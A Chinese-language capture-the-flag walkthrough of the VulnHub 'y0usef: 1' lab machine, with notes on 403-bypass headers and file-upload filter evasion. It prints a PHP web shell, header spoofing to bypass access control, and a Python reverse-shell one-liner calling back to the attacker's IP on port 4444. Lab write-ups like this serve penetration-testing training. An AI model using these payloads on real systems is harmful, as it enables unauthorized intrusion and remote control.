# 相关信息

kali：192.168.195.13

靶机：192.168.195.30

相关的靶机介绍：[y0usef: 1 ~ VulnHub](https://www.vulnhub.com/entry/y0usef-1,624/)

下载地址：https://download.vulnhub.com/y0usef/y0usef.ova

难度：Easy

# 文字思路

## 全流程思路：

主机发现

端口扫描：22,80端口，基本确认思路就是web探测然后ssh连接。

web信息搜集	指纹探测	403 Bypass	文件上传	提权

## 局部思路

### 403绕过

1. 旁站的方式绕过
2. 覆盖url的方式
3. ReFerer修改
4. X打头的代理参数修改

### 文件上传检测绕过

1. 更改后缀名
2. 更改mime类型------>对于相关文件的 ：`Content-Type`头部
3. 对文件头部完全的替换为另一种文件类型的头部，将恶意代码放在文件其他部分

### 下意识的操作

1. 对目标网站进行指纹信息识别。
2. 遇到 `403`禁止访问的时候最好进行 `network`抓包查看返回码是否为 `403`
3. ==进入后台后的思路基本就是寻找上传漏洞==
4. 如何判断什么是base64:
    1. 0-9,a-z,A-Z,/+=
    2. 很多base64编码的结尾会有一个 `=`结尾
5. 在发现后台的登陆界面后我们一般要手动的进行弱口令的猜解，不要直接进行字典的爆破。（看个人习惯吧）


## 主要的知识点

1. 403绕过
2. 文件上传

# 具体流程

## 信息收集

1. 主机发现和相关服务，版本信息搜集。

    <img src="http://image.cchl.fun/kali_image/image-20230525175950016.png" alt="image-20230525175950016" style="zoom: 50%;" />

2. 访问web网页（没有什么信息）和它的robots.txt文件（不存在），包括我们==查看完源码==后依然没有什么搜获。

    <img src="http://image.cchl.fun/kali_image/image-20230525180222646.png" alt="image-20230525180222646" style="zoom: 50%;" />

3. 使用 `whatweb`工具来对该网页进行相关的 ==指纹信息==识别。发现 `Bootstrap`开发框架爱等等。==这个必须形成下意识的操作==，即使可能没有什么能立即使用的信息。

    ![image-20230525180434797](http://image.cchl.fun/kali_image/image-20230525180434797.png)

    选择 `dirsearch`进行 `web` 路径爬取，发现了大量的 `403禁止访问`禁止我们进行访问，同时发下 `adminstration`是一个重定向的路径，然后我们对该文件进行访问后发现依然是 `403`，即使我们通过工作台查看它网络抓包的返回码也是 `403` 

    这里非常细节，为确保确实 `403`还查看网络抓包。

    ![image-20230525182036628](http://image.cchl.fun/kali_image/image-20230525182036628.png)

## 漏洞：403绕过

​		由于目标网站出现大量的 `403`，而且我们也没有其他的什么大的发现所以可以尝试进行 `403`绕过。

### X打头的绕过

1. 通过`burpsuite`来进行抓包，方便分析。我们通过 `X-Forwarded-For`这个参数来进行绕过，我们将其设为 `127.0.0.1`相当于我们让靶机认为是它自己在访问自己的网站，从而让我们能够绕过 `403`。										[==403各种绕过==](#tag2)<a id='back2'></a>

    <img src="https://image.cchl.fun/kali_image/image-20230525190546668.png" alt="image-20230525190546668" style="zoom: 50%;" />

2. 然后我们直接在浏览器访问的时候进行数据包的修改来进行成功的访问，发现是个登陆的界面。

    <img src="https://image.cchl.fun/kali_image/image-20230525190801676.png" alt="image-20230525190801676" style="zoom:50%;" />

3. 然后再对该页面进行 `burpsuite`的抓包分析和访问，我们可以进行简单的密码猜解然后来登陆尝试。发现为弱口令用户和密码 `admin` `admin`。我们可以发现最终进入到后台。

    ==注意==：在这部操作中的所有数据包都要加上 `X-Forwarded-For:127.0.0.1`

    <img src="https://image.cchl.fun/kali_image/image-20230525192002693.png" alt="image-20230525192002693" style="zoom:50%;" />

## 漏洞：文件上传

通过我们进入发现了个 `Upload file`这个选项，这不相等与明示我们要进行相关的 ==文件上传==漏洞测试吗？			==记得加上X字段头==

1. 我们自己上传一个 `php`的一句话恶意脚本 `cchl.php`，但是我们发现了一个问题，我们的上传文件被禁止了。

    ```php
    <?php $var=shell_exec($_GET['cmd']);echo $var?>
    ```

    <img src="https://image.cchl.fun/kali_image/image-20230525194420239.png" alt="image-20230525194420239" style="zoom:67%;" />

2. 所以我进行 `文件上传`的检测绕过，通过修改 `mime`的类型来进行尝试。及 `Content-Type`头部。发现成功的上传，同时可以看到该文件被重命名和它的存放路径。

    ![image-20230525194758674](https://image.cchl.fun/kali_image/image-20230525194758674.png)

3. 我们进行访问，同时携带相关的 `payload`可以发现成功的回显。证明我的文件上传漏洞利用成功，接下来就是反弹 `shell`了。

    <img src="https://image.cchl.fun/kali_image/image-20230525200625670.png" alt="image-20230525200625670" style="zoom:80%;" />

## 反弹shell

1. 查看是否有 `python`环境，上传的 `payload`为 `which python `。

    ![image-20230525202017107](https://image.cchl.fun/kali_image/image-20230525202017107.png)

2. 上传 `payload`，打开本地的 `4444`监听。发现成功的突破边界，拿到一个用户的权限。这个网站不加 ==X-Forwarded-For==字段也是可以的。

    ```bash
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.121.13",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
    ```

    <img src="https://image.cchl.fun/kali_image/image-20230525202359779.png" alt="image-20230525202359779" style="zoom:67%;" />

3. 浏览 `passwd`文件来查看可以使用 `shell`的用户，同时对发现的 `yousef`用户进行相关目录的浏览发现第一个 `flag`。

    <img src="https://image.cchl.fun/kali_image/image-20230525203343284.png" alt="image-20230525203343284" style="zoom:67%;" />

    当我们查看 `flag`的时候，我应该具有判断这 `flag`可能为 `base64`编码的能力，对这个 `flag`解密后我们发现很惊喜

    <img src="https://image.cchl.fun/kali_image/image-20230525203611088.png" alt="image-20230525203611088" style="zoom:67%;" />

## 直接登陆提权

1. 这个靶机的提权非常简单，根据上一步的发现。`ssh`登陆后，我先进行常规的 `id, sudo -l`等信息搜集。

    - 通过 `id` 发现我们是有 `sudo`权限的                                                          [==什么是secure_path==](#back5)<a id='tag5'></a>

    - 通过 `sudo -l`我们可以看到我们是可以 `secure_path`。通过阅读我们可以明显的发现我们是 `ALL:ALL`什么权限都有的

    - 进而 `sudo -s` 直接切换为 `root`用户，然后拿取 `flag` 但同时我们也发现这个 `flag`可以也为 `base64`解码后也简单明了，为作者的联系方式。

        到处靶机拿下

<img src="https://image.cchl.fun/kali_image/image-20230525204126682.png" alt="image-20230525204126682" style="zoom: 50%;" />

<img src="https://image.cchl.fun/kali_image/image-20230525203952544.png" alt="image-20230525203952544" style="zoom: 67%;" />

# 相关工具



### whatweb

1. what?

    用于识别和分析目标网站的技术栈和特征。它可以自动探测网站使用的Web应用程序、脚本语言、Web服务器和其他相关技术信息，帮助安全专业人员评估目标系统的弱点和漏洞。

2. 具体实例

    1. whatweb http://1.1.1.1

# 相关知识

## 重要

### 403绕过‘

1. url覆盖                                                    			[==返回==](#back2)<a id='tag2'></a>

    1. 我们将 `GET`更改为 `/`既访问网站的根目录。然后通过添加 `X-Original-URL/ReFerer/`来访问相关的目录。让服务端以为我们是从 `根目录`过来的，已经验证过了。

    ```
    Request
    GET /A/B.php HTTP/1.1
    host
    
    Request
    GET / HTTP/1.1
    X-Original-URL: /A/B.php               //该字段用于表面我们要访问的文件是什么
    ```

2. 旁站绕过

    1. what?

        - 旁站是指在同一个域名下的不同主机名构成的网址叫做旁站。
        
        - 比如当我们通过 `a.b.c:80/cchl.php`来访问一个网址的时候是 `403`，我们可以收集 `b.c`域名下的其他主机名eg: `1,2等等`。然后我们再通过 `1.b.c:80/cchl.php`来访问该网页资源，是有可能访问成功的，从而达到绕过的作用。
        - 修改的字段为 `host`
        
        - 服务端会认为你是自己域名下的 `不同主机`访问的，会认为你已经经过了验证。而且开发者在验证是否能访问的时候只对 `a.b.c`这个进行了验证，而对其他可以访问的方式没有验证
        
            ```
            Request
            GET a.b.c/cchl.php HTTP/1.1
            host
            
            Request
            GET 1.b.c/cchl.php HTTP/1.1
            host
            ```


3. ReFerer修改

    1. what?

        ```					
        Request
        GET /A/B.php HTTP/1.1
        host
        
        Request
        GET /A/B.php HTTP/1.1
        X-Original-URL: https://ip/login.php	//这个字段是表明我们从哪里请求的资源，可以让服务端误认为我们已经验证过了（前提									//是 https://ip/login.php会被服务端认为是一个已经验证过的网页）
        ```


4. X打头绕过

    1. what？

        x打头的字段并非http的官方字段，但是有非常大的使用量。因为现在的很多网站会有多层的代理才能实现访问。而这些字段一般就是这个作用。

    2. 相关的头部

        X-Originating-IP:127.0.0.1   让系统误认为是自己访问自己

        X-Remote-IP:127.0.0.1   让系统误认为是自己访问自己

        X-Forwarded-For:127.0.0.1   让系统误认为是自己访问自己



### secure_path

1. what?                                                                                   [==返回==](#tag5)<a id='back5'></a>

    `secure_path` 是 Linux 系统中的一个环境变量，用于指定 `sudo` 命令在执行时搜索可执行文件的路径。具体来说，它定义了在执行 `sudo` 命令时，系统应该在哪些目录中查找要执行的命令



## 了解即可

### Bootstrap

1. what?

    Bootstrap 是一个用于快速开发 Web 应用程序和网站的前端框架。Bootstrap 是基于 HTML、CSS、JAVASCRIPT 的。

